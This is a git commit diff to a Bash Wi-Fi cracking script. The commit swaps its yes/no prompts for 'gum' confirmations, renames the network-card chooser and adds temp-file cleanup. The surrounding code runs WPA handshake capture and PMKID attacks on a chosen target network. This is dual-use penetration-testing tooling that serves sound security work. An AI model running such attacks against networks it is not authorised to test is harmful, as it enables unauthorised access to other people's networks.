723c386c6dd8f1bb5e4afd9ce074cf0792e52547
lucas blanco <lucasblancodev@gmail.com>
2023-09-18 22:17:19 -0300

    Gumize the confirmations of the user

--- wifi_crack.sh
+++ wifi_crack.sh
@@ -58,22 +58,11 @@ function exit_script() {
 		echo -e "\n${warn}[*]${nc} We are gonna to exit the script..."
 		echo -e "\n${info}[·]${nc} Managed mode allows you to navigate into internet and that stuff. If had finished your attacks it's likeable to bring the network back to managed mode."
 		echo -e "\n${info}[·]${nc} If you are cracking some password bring the network card to managed mode, doesn't affect on anything."
-		echo -ne "\n${ask}[?]${nc} Do you want to bring the network back to managed mode? [y/n]: "
-		read -r answer
-		if [ "${answer,,}" = "y" ]; then
-			enable_managed_mode
-		else
-			echo -e "\n${yellow}[!]${nc} Leaving network card in monitor mode..."
-		fi
+		gum confirm "Do you want to bring the network back to managed mode?" && enable_managed_mode || echo -e "\n${yellow}[!]${nc} Leaving network card in monitor mode..."
 		echo -e "\n${info}[·]${nc} I specially recommend you to kill the remaining processes if you use a PMKID attack, because I found that hcxdumptool doesn't kill itself for some reason..."
 		echo -e "\n${info}[·]${nc} You could also verify this with the command: ${cmd}ps aux | grep -i \"hcxdumptool\"${nc}"
-		echo -ne "\n${ask}[?]${nc} Do you want to kill remaining processes?[y/n]: "
-		read -r answer
-		if [ "${answer,,}" = "y" ]; then
-			kill_remaining_processes
-		else
-			echo -e "\n${yellow}[!]${nc} Leaving remaining processes running..."
-		fi
+		gum confirm "Do you want to kill remaining processes?" && kill_remaining_processes || echo -e "\n${yellow}[!]${nc} Leaving remaining processes running..."
+		gum confirm "Do you want to delete all the temporary files? (dump files, etc)" && delete_temp_files || echo -e "\n${yellow}[!]${nc} Leaving temporary files..."
 	fi
 	echo -e "\n${good}[+]${nc} Exiting..."
 	tput cnorm 2>/dev/null
@@ -110,6 +99,11 @@ function user_sleep() {
 	sleep 0.5
 }
 
+function delete_temp_files() {
+	rm -rf airodump*
+	rm -rf capture_*
+}
+
 function select_target_network() {
 	echo -e "\n${yellow}[*]${nc} Now we are going to scan the networks around you..."
 	echo -e "${yellow}[*]${nc} A new terminal will be opened to show you the networks around you"
@@ -129,7 +123,7 @@ function select_target_network() {
 	# Eliminamos las primera linea del archivo
 	sed -i '1,2d' ${airodump_file}-01.csv
 	# Eliminamos las lineas donde se encuentran los clientes, para dejar solo las redes
-	sed -i '/Station MAC/,$d'${airodump_file}-01.csv
+	sed -i '/Station MAC/,$d' ${airodump_file}-01.csv
 	# Atajamos posibles typos que puedan haber
 	sed -i 's/2,4/2.4/g' ${airodump_file}-01.csv
 	sed -i 's/5,8/5.8/g' ${airodump_file}-01.csv
@@ -147,9 +141,11 @@ function select_target_network() {
 
 	echo -e "\n${good}[+]${nc} You choose ${yellow}${bssid}${nc} on channel ${yellow}${channel}${nc} with the name ${yellow}${ssid}${nc}"
 	rm -rf airodump*
+	handshake
 }
 
 function handshake() {
+	gum style "Attacking $ssid"
 	echo -e "\n${doing}[~]${nc} Listening network traffic of ${bssid} on channel ${channel}"
 	user_sleep
 	echo -e "\n${yellow}[*]${nc} A new terminal will be opened to show you the traffic of the network"
@@ -202,15 +198,7 @@ function handshake() {
 			wait $airodump_filter_xterm_pid &>/dev/null
 			echo -e "\n${wrong}[-]${nc} The failed captures will be deleted"
 			rm -rf capture_*
-			echo -ne "\n${ask}[?]${nc} Do you want to try again with the same network? [y/n]: " && read answer
-			if [[ $answer == "y" ]]; then
-				handshake
-			fi
-			echo -ne "\n${ask}[?]${nc} Do you want to try again with another network? [y/n]: " && read answer
-			if [[ $answer == "y" ]]; then
-				select_target_network
-				handshake
-			fi
+			gum confirm "Do you want to try again? on the same network?" && handshake || gum confirm "Do you want to try again on another network?" && select_target_network
 		fi
 	fi
 	tshark -r capture_${bssid}-01.cap -Y "eapol" 1>handshake.txt 2>/dev/null
@@ -264,21 +252,13 @@ function pmkid() {
 		echo -e "\n${info}[·]${nc} Use the following command: ${cmd}sudo kill -9 $hashcat_xterm_pid${nc}"
 	else
 		echo -e "\n${wrong}[!]${nc} The hashes are not captured :("
-
-		echo -ne "\n${ask}[?]${nc} Do you want to retry? (y/n): "
-		read option
-
-		if [ "${option,,}" == "yes" ] || [ "${option,,}" == "y" ]; then
-			echo -e "\n${doing}[~]${nc} Retrying...\n"
-			user_sleep
-			pmkid
-		fi
+		gum confirm "Do you want to retry?" && pmkid
 	fi
 }
 
 function attack() {
 	#clear
-	choose_card
+	choose_network_card
 
 	echo -e "${info}[·]${nc} Starting ${attack_mode} attack with $network_card network card"
 
@@ -286,7 +266,6 @@ function attack() {
 
 	if [[ "${attack_mode,,}" == "handshake" ]]; then
 		select_target_network
-		handshake
 	elif [[ "${attack_mode,,}" == "pmkid" ]]; then
 		pmkid
 	else
@@ -296,26 +275,17 @@ function attack() {
 
 }
 
-function choose_card() {
-	echo -e "\n${ask}[?]${nc} Choose a network card: "
-	PS3="Network card: "
-	select network_card in $(ifconfig | awk '{print $1}' | grep : | sed 's/://'); do
-		if [[ -z $network_card ]]; then
-			echo -e "\n${wrong}[-]${nc} Invalid option"
-		else
-			echo -e "\n${good}[+]${nc} You choose ${network_card}\n"
-			break
-			user_sleep
-		fi
-	done
+function choose_network_card() {
+	network_cards=()
+	while IFS= read -r line; do
+		network_cards+=("$line")
+	done < <(ifconfig | awk '{print $1}' | grep : | sed 's/://')
+	network_card=$(gum choose "${network_cards[@]}")
 	we_attack=0
 }
 
 function wait_for_confirmation() {
-	echo -ne "\n${ask}[?]${nc} Press ${ask}enter${nc} to continue..." && read enter
-	if [[ $enter != "" ]]; then
-		exit_script
-	fi
+	echo -ne "\n${ask}[?]${nc} Press ${ask}any key${nc} to continue..." && read
 }
 # Main function
 
@@ -338,11 +308,11 @@ done
 if [ "$(id -u)" == "0" ]; then
 
 	if [[ $network_card_mode == "monitor" ]]; then
-		choose_card
+		choose_network_card
 		enable_monitor_mode
 		exit_script
 	elif [[ $network_card_mode == "managed" ]]; then
-		choose_card
+		choose_network_card
 		enable_managed_mode
 		exit_script
 	fi
@@ -354,7 +324,6 @@ if [ "$(id -u)" == "0" ]; then
 
 	dependencies
 	attack
-
 	exit_script
 else
 	echo -e "${wrong}[!]${nc} You must be root to run this script"
